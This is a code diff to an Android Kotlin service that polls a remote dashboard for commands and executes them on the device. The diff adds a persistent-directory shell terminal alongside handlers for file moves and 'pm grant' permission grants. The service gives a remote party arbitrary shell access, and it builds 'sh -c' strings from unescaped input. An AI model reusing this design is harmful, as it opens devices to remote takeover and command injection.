@@ -58,6 +58,9 @@ class ConnectorService : Service() {
     private var wakeLock: PowerManager.WakeLock? = null
     private var pollThread: Thread? = null
 
+    // ── Persistent working directory for shell ─────────────────────────────
+    @Volatile private var currentDir = "/sdcard"
+
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
@@ -94,6 +97,7 @@ class ConnectorService : Service() {
             startForeground(NOTIF_ID, buildNotification("Connecting…", false))
         }
         isRunning = true
+        currentDir = prefs.getString("shell_dir", "/sdcard") ?: "/sdcard"
         startPolling()
         return START_STICKY
     }
@@ -216,8 +220,8 @@ class ConnectorService : Service() {
             cmd.startsWith("move:")      -> { val p = cmd.removePrefix("move:").split(":"); Pair(if (p.size < 2) "ERROR" else FileOperations.moveFile(p[0], p[1]), "command_result") }
             cmd.startsWith("file_info:") -> Pair(FileOperations.getFileInfo(cmd.removePrefix("file_info:")), "command_result")
 
-            // ── Shell ──
-            cmd.startsWith("shell:")     -> Pair(runShell(cmd.removePrefix("shell:")), "command_result")
+            // ── Shell (stateful — cd persists across commands) ──
+            cmd.startsWith("shell:")     -> Pair(handleShellCommand(cmd.removePrefix("shell:")), "command_result")
 
             // ── Package Manager (via shell) ──
             cmd.startsWith("pm_grant:")     -> { val p = cmd.removePrefix("pm_grant:").split(":"); Pair(if (p.size < 2) "ERROR" else runShell("pm grant ${p[0]} ${p[1]}"), "command_result") }
@@ -667,21 +671,120 @@ class ConnectorService : Service() {
     }
 
     // ─────────────────────────────────────────
-    //  SHELL
+    //  SHELL — full stateful terminal
     // ─────────────────────────────────────────
 
-    private fun runShell(cmd: String): String {
+    /**
+     * Entry point for all user shell commands.
+     * Handles "cd" specially so the working directory persists across commands.
+     * Every response includes a "[dir:/path]" trailer so the dashboard can show
+     * the current prompt path.
+     */
+    private fun handleShellCommand(rawCmd: String): String {
+        val trimmed = rawCmd.trim()
+
+        return when {
+            // ── cd (no arg, ~, or / → home) ───────────────────────────────
+            trimmed == "cd" || trimmed == "cd ~" || trimmed == "cd ~/" || trimmed == "cd /" -> {
+                currentDir = if (trimmed == "cd /") "/" else "/sdcard"
+                saveShellDir()
+                "[dir:$currentDir]"
+            }
+
+            // ── cd - (previous dir — not tracked, just report) ────────────
+            trimmed == "cd -" -> "cd: OLDPWD not set\n[dir:$currentDir]"
+
+            // ── cd <target> ────────────────────────────────────────────────
+            trimmed.startsWith("cd ") -> {
+                val arg = trimmed.removePrefix("cd ").trim()
+                    .replace("~", "/sdcard")
+                val resolved = resolveShellPath(arg)
+                // Verify the resolved path is a real directory on device
+                val check = rawExec("test -d \"$resolved\" && echo OK || echo FAIL", currentDir, 5)
+                if (check.trim() == "OK") {
+                    currentDir = resolved
+                    saveShellDir()
+                    "[dir:$currentDir]"
+                } else {
+                    "cd: $arg: No such file or directory\n[dir:$currentDir]"
+                }
+            }
+
+            // ── pwd — return current dir ───────────────────────────────────
+            trimmed == "pwd" -> "$currentDir\n[dir:$currentDir]"
+
+            // ── All other commands — run inside currentDir ─────────────────
+            else -> {
+                val out = rawExec(trimmed, currentDir, 30)
+                val body = out.trimEnd('\n')
+                if (body == "(no output)") "[dir:$currentDir]"
+                else "$body\n[dir:$currentDir]"
+            }
+        }
+    }
+
+    /** Resolve a shell path relative to [baseDir]. */
+    private fun resolveShellPath(target: String): String {
+        val base = if (target.startsWith("/")) "/" else currentDir
+        val parts = (if (target.startsWith("/")) "" else base)
+            .split("/")
+            .toMutableList()
+        target.trimEnd('/').split("/").forEach { seg ->
+            when (seg) {
+                "", "." -> {}
+                ".."    -> if (parts.size > 1) parts.removeAt(parts.lastIndex)
+                else    -> parts.add(seg)
+            }
+        }
+        val result = parts.joinToString("/").ifEmpty { "/" }
+        return if (result.length > 1) result.trimEnd('/') else result
+    }
+
+    private fun saveShellDir() {
+        prefs.edit().putString("shell_dir", currentDir).apply()
+    }
+
+    /**
+     * Execute [cmd] as "sh -c" with CWD = [dir].
+     * stdout and stderr are read concurrently to avoid pipe-buffer deadlock.
+     * Killed after [timeoutSec] seconds.
+     */
+    private fun rawExec(cmd: String, dir: String, timeoutSec: Long = 30): String {
         return try {
-            val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
-            val out = p.inputStream.bufferedReader().readText()
-            val err = p.errorStream.bufferedReader().readText()
-            p.waitFor()
+            val proc = ProcessBuilder("sh", "-c",
+                    "cd \"$dir\" 2>/dev/null || cd /sdcard; $cmd")
+                .redirectErrorStream(false)
+                .start()
+            proc.outputStream.close()   // no stdin
+
+            var stdout = ""
+            var stderr = ""
+            val tOut = Thread { stdout = proc.inputStream.bufferedReader(Charsets.UTF_8).readText() }
+            val tErr = Thread { stderr = proc.errorStream.bufferedReader(Charsets.UTF_8).readText() }
+            tOut.isDaemon = true; tErr.isDaemon = true
+            tOut.start(); tErr.start()
+
+            val exited = proc.waitFor(timeoutSec, TimeUnit.SECONDS)
+            if (!exited) {
+                proc.destroyForcibly()
+                tOut.join(500); tErr.join(500)
+                return "ERROR: command timed out after ${timeoutSec}s"
+            }
+            tOut.join(2000); tErr.join(2000)
+
             buildString {
-                if (out.isNotEmpty()) append(out)
-                if (err.isNotEmpty()) append(if (out.isNotEmpty()) "\n[stderr]\n$err" else err)
+                if (stdout.isNotEmpty()) append(stdout.trimEnd('\n'))
+                if (stderr.isNotEmpty()) {
+                    if (stdout.isNotEmpty()) append("\n")
+                    append(stderr.trimEnd('\n'))
+                }
             }.ifEmpty { "(no output)" }
         } catch (e: Exception) { "ERROR: ${e.message}" }
     }
+
+    /** Legacy helper used internally (pm, settings, screencap, etc.). */
+    private fun runShell(cmd: String, timeoutSec: Long = 15): String =
+        rawExec(cmd, currentDir, timeoutSec)
 
     // ─────────────────────────────────────────
     //  SEND RESULT
